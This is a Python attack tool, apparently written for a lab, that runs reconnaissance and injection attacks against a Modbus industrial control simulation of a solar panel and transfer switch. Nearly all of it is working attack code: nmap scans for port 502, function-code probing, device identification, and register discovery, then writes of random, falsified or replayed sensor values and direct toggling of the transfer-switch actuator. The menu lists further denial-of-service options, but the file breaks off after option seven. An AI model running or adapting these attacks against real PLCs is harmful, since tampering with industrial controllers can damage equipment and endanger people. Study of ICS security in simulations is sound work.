"""
 Author: Jaxson Brown
   Date: 20/02/2023
Purpose: Wrapper python script to run attacks against an ICS simulation using
            the Modbus communication protocol. This script acts as a wrapper
            to run other command line utilities such as nmap. 

"""


import nmap
import random
from time import sleep
from threading import Thread
from pyModbusTCP.client import ModbusClient
import numpy as np
from scipy.stats import norm

# constants
LOGO = r"""
  ___                _      ___     _    _   ___ _           _      _   _             ___     _                  _  _   _           _       
 / __|_ __  __ _ _ _| |_   / __|_ _(_)__| | / __(_)_ __ _  _| |__ _| |_(_)___ _ _    / __|  _| |__  ___ _ _ ___ /_\| |_| |_ __ _ __| |__ ___
 \__ \ '  \/ _` | '_|  _| | (_ | '_| / _` | \__ \ | '  \ || | / _` |  _| / _ \ ' \  | (_| || | '_ \/ -_) '_|___/ _ \  _|  _/ _` / _| / /(_-<
 |___/_|_|_\__,_|_|  \__|  \___|_| |_\__,_| |___/_|_|_|_\_,_|_\__,_|\__|_\___/_||_|  \___\_, |_.__/\___|_|    /_/ \_\__|\__\__,_\__|_\_\/__/
                                                                                         |__/                                                  
"""

# globals
stop_looping = False

# helper function to detect enter key interupts
def _check_for_enter():
    global stop_looping
    input()
    stop_looping = True

# Function: address_scan
# Purpose: Performs an address scan on the ICS simulation network 192.168.0.0/24. The
#   scan identifies hosts running with port 502 open, as this port is used for Modbus
#   TCP communication.
# Input: (String) ip_CIDR - ip network to scan in CIDR notation
def address_scan(ip_CIDR):
    print("### ADDRESS SCAN ###")
    print(f"Performing an nmap ip scan on network {ip_CIDR} on port 502")

    # initialize the nmap scanner
    nm = nmap.PortScanner()

    # scan the ip(s) on modbus port 502
    nm.scan(ip_CIDR, "502")
    print(f"Command ran: {nm.command_line()}")

    # print scan results
    for host in nm.all_hosts():
        print("--------------------------------------------")
        print(f"Host: {host} ({nm[host].hostname()})")
        print(f"Host State: {nm[host].state()}")
        for proto in nm[host].all_protocols():
            print(f"\tProtocol: {proto}")
            ports = nm[host][proto].keys()
            for port in ports:
                print(f"\tPort: {port}, State: {nm[host][proto][port]['state']}")

                # check if modbus port is open
                if nm[host][proto][port]['state'] == "open":
                    print("\tModbus port 502 is open.")
                    print("It is likely this host is a Modbus Client")

    print("### ADDRESS SCAN FINISH ###")

# Function: function_code_scane
# Purpose: Scans all valid function codes for a list a specified Modbus clients, checking if
#   the function codes work.
# Input: (List(String)) ip_addressess
def function_code_scane(ip_addresses):
    publicFC = {1,2,3,4,5,6,7,8,11,12,15,16,17,20,21,22,23,24,43}
    userDefFC = {65,66,67,68,69,70,71,72,100,101,102,103,104,105,106,107,108,109,110}
    reservedFC = {9,10,13,14,41,42,90,91,125,126,127}
    allFc = [publicFC, userDefFC, reservedFC]

    print("### FUNCTION CODE SCAN ###")

    for ip in ip_addresses:
        print(f"===== Performing a function code scan on {ip} =====")
        print()
        client = ModbusClient(host=ip, port=502)
    
        for fc_set in allFc:
            if 1 in fc_set:
                print("***Scanning public function codes***")
            elif 65 in fc_set:
                print("***Scanning private function codes***")
            else:
                print("***Scanning reserved function codes***")

            for fc in fc_set:
                # send custom pdu request
                fc_bytes = fc.to_bytes(1, 'big')
                pdu = fc_bytes + b'\x00\x00\x00\x00'
                response = client.custom_request(pdu)

                # check if exception occurred
                if response == None:
                    # check if an illegal function error occurred (means the modbus client doesn't accept the fc)
                    if client.last_except != 1:
                        print(f"Acception function code {fc} (with non-illegal exception code: {client.last_except})")
                else:
                    print(f"Accepted function code {fc}")
        print()
        client.close()
    print("### FUNCTION CODE SCAN FINISH ###")

# Function: device_identification_attack
# Purpose: Uses function code 0x2B to attempt to find device information.
# Input: (List(String)) ip_addresses
def device_identification_attack(ip_addresses):
    print("### DEVICE IDENTIFICATION ATTACK ###")

    for ip in ip_addresses:
        print(f"===== Performing device identification on {ip} =====")
        client = ModbusClient(host=ip, port=502)
        response = client.read_device_identification(read_code=1)

        # check if device identification is possible
        if response == None:
            print("Modbus client doesn't support function code 0x2B")
        else:
            # extract data from all object types
            print("*** Basic object type data: ***")
            response = client.read_device_identification(read_code=1)
            for i in response.objects_by_id:
                print(response.objects_by_id.get(i))

            print("*** Regular object type data: ***")
            response = client.read_device_identification(read_code=2)
            for i in response.objects_by_id:
                print(response.objects_by_id.get(i))

            print("*** Extended object type data: ***")
            response = client.read_device_identification(read_code=3)
            for i in response.objects_by_id:
                print(response.objects_by_id.get(i))
        print()
        client.close()
    print("### DEVICE IDENTIFICATION ATTACK FINISH ###")

# Function: naive_sensor_read
# Purpose: Scans over all registers and coils and attempts for find changing values,
#   which can potentially expose used addresses.
# Input: (List(String)) ip_addresses
def naive_sensor_read(ip_addresses):
    print("### NAIVE SENSOR READ ###")

    for ip in ip_addresses:
        print(f"===== Performing naive sensor read on {ip} =====")
        print("Scanning for all registers (coils/di/ir/hr) for 15 seconds")
        print("Attempting to find sensor values")
        print("-------------------------------")

        client = ModbusClient(host=ip, port=502)

        prev_coil = client.read_coils(0, 2000)
        prev_di = client.read_discrete_inputs(0, 2000)
        prev_ir = client.read_input_registers(0, 125)
        prev_hr = client.read_holding_registers(0, 125)

        coil_found = []
        di_found = []
        ir_found = []
        hr_found = []

        for _ in range(15):
            sleep(1)
            coil = client.read_coils(0, 2000)
            di = client.read_discrete_inputs(0, 2000)
            ir = client.read_input_registers(0, 125)
            hr = client.read_holding_registers(0, 125)

            # compare previous response to current response
            for i in range(len(prev_coil)):
                if coil[i] != prev_coil[i]:
                    if i not in coil_found:
                        print(f"Changing coil found at location {i} (likely a sensor/actuator value)")
                    coil_found.append(i)
            prev_coil = coil
            for i in range(len(prev_di)):
                if di[i] != prev_di[i]:
                    if i not in di_found:
                        print(f"Changing discrete input found at location {i} (likely a sensor/actuator value)")
                    di_found.append(i)
            prev_di = di
            for i in range(len(prev_ir)):
                if ir[i] != prev_ir[i]:
                    if i not in ir_found:
                        print(f"Changing holding register found at location {i} (likely a sensor/actuator value)")
                    ir_found.append(i)
            prev_coil = coil
            for i in range(len(prev_hr)):
                if hr[i] != prev_hr[i]:
                    if i not in hr_found:
                        print(f"Changing holding register found at location {i} (likely a sensor/actuator value)")
                    hr_found.append(i)
        print("-------------------------------")
        client.close()
    print("### NAIVE SENSOR READ FINISH ###")

# Function: sporadic_sensor_measurement_injection
# Purpose: Writes completely random values to coil/holding registers.
# Input: (List(String)) ip_addresses 
def sporadic_sensor_measurement_injection(ip_addresses):
    print("### SPORADIC SENSOR MEASUREMENT INJECTION ###")
    
    for ip in ip_addresses:
        print(f"Injecting random data for 10 seconds into {ip}")
        print("Affecting found addresses: coil 10, holding register 20")

        client = ModbusClient(host=ip, port=502)

        # affect coils
        for _ in range(300):
            sleep(0.05)
            coil_value = random.choice([True, False])
            client.write_single_coil(10, coil_value)

        # affect holding registers
        for _ in range(300):
            sleep(0.05)
            hr_value = random.randint(0, 65535)
            client.write_single_register(20, hr_value)
        
        client.close()
    print("### SPORADIC SENSOR MEASUREMENT INJECTION FINSIH ###")

# Function: calculated_sensor_measure_injection
# Purpose: Writes calculated values to make it seem like a solar panel is working. Uses
#   a normal distribution model to simulate a running solar panel.
# Input: (List(String)) ip_addresses
def calculated_sensor_measure_injection(ip_addresses):
    print("### CALCULATED SENSOR MEASUREMENT INJECTION ###")

    for ip in ip_addresses:
        print(f"Overwriting holding register address 20 for {ip}")
        print("Injecting data to make it appear as if high amounts of solar power is being generated")
        print("Note: this attack should be executed at \"morning\" time for the simulation")

        client = ModbusClient(host=ip, port=502)

        # create a set of calculated values to inject
        # Note: power_const of 15 generates high amount of power for a typical 2W rated solar panel
        power_const = 15
        efficency = 0.7

        # Generate 48 time intervals over 24 hours (every 30 minutes)
        x = np.linspace(0, 24, 48)

        # Generate a normal distribution representing solar generation in milliWatts (provide estimated constants)
        calculated_vals = norm.pdf(x, 12, 2)*power_const*efficency*1000
        calculated_vals = calculated_vals.astype(int)

        # inject calculated values
        for i in calculated_vals:
            for _ in range(5):
                client.write_single_register(20, i)
                sleep(0.2)
        client.close()
    print("### CALCULATED SENSOR MEASUREMENT INJECTION FINISHED ###")

# Function: replayed_measurement_injection
# Purpose: Captures data and replays the data. Press enter to stop capturing data
#   and to start replaying it
# Input: (List(String)) ip_addresses
def replayed_measurement_injection(ip_addresses):
    global stop_looping
    print("### REPLAYED MEASUREMENT INJECTION ###")

    for ip in ip_addresses:
        captured_vals = []

        print(f"Capturing data from {ip} for ")
        print("Press enter to stop capturing data")
        client = ModbusClient(host=ip, port=502)

        stop_looping = False
        th_stopper = Thread(target=_check_for_enter)
        th_stopper.start()

        while not stop_looping:
            val = client.read_holding_registers(20)[0]
            captured_vals.append(val)
            print(f"Captured value: {val}")
            sleep(1)
        
        print(captured_vals)
        print("Replaying captured data")
        for i in captured_vals:
            client.write_single_register(20, i)
            print(f"Injected value: {i}")
            sleep(1)
        client.close()
    print("### REPLAYED MEASUREMENT INJECTION FINISH ###")

# Function: altered_actuator_state
# Purpose: Changes the state of the transfer switch actuator
# Input: (List(String)) ip_addresses
def altered_actuator_state(ip_addresses):
    print("### ALTERED ACTUATOR STATE ###")

    for ip in ip_addresses:
        client = ModbusClient(host=ip, port=502)

        while True:
            print(f"Changing the state of the transfer switch for PLC {ip}")
            ts_state = int(input("Change the transfer switch to (1) mains power or (2) solar power?"))
            if ts_state == 1:
                print("Setting transfer switch to mains power")
                client.write_single_coil(10, 0)
            elif ts_state == 2:
                print("Setting transfer switch to solar power")
                client.write_single_coil(10, 1)
            
            cont = input("Change transfer switch state again? (y/n)")
            if cont != "y":
                break

        client.close()
    print("### ALTERED ACTUATOR STATE FINISH ###")

# Main function
if __name__ == "__main__":
    print(LOGO)

    menuPrompt = """
Please select an attack to run against the ICS simulation:

    Reconnaissance Attacks
    (0) - address scan
    (1) - function code scan
    (2) - device identification attack

    Response and Measurement Injection Attacks
    (3) - naive sensor read
    (4) - sporadic sensor measurement injection
    (5) - calculated sensor measure injection
    (6) - replayed measurement injection
    
    Command Injection Attacks
    (7) - altered actuator state
    (8) - altered control set points
    (9)* - force listen mode
    (10)** - restart communication

    Denial of Service Attacks
    (11) - packet flooding attack
    (12) - invalid cyclic redundancy code

"""

    while True:
        # get user input (only as int)
        selection = -1
        try:
            while selection == -1:
                selection = int(input(menuPrompt))
        except ValueError:
            pass

        # perform cyber attack
        if selection == 0:
            address_scan("192.168.0.0/24")
        elif selection == 1:
            function_code_scane(["192.168.0.21", "192.168.0.22"])
        elif selection == 2:
            device_identification_attack(["192.168.0.21", "192.168.0.22"])
        elif selection == 3:
            naive_sensor_read(["192.168.0.21", "192.168.0.22"])
        elif selection == 4:
            sporadic_sensor_measurement_injection(["192.168.0.21", "192.168.0.22"])
        elif selection == 5:
            calculated_sensor_measure_injection(["192.168.0.21", "192.168.0.22"])
        elif selection == 6:
            replayed_measurement_injection(["192.168.0.21", "192.168.0.22"])
        elif selection == 7:
            altered_actuator_state(["192.168.0.21", "192.168.0.22"])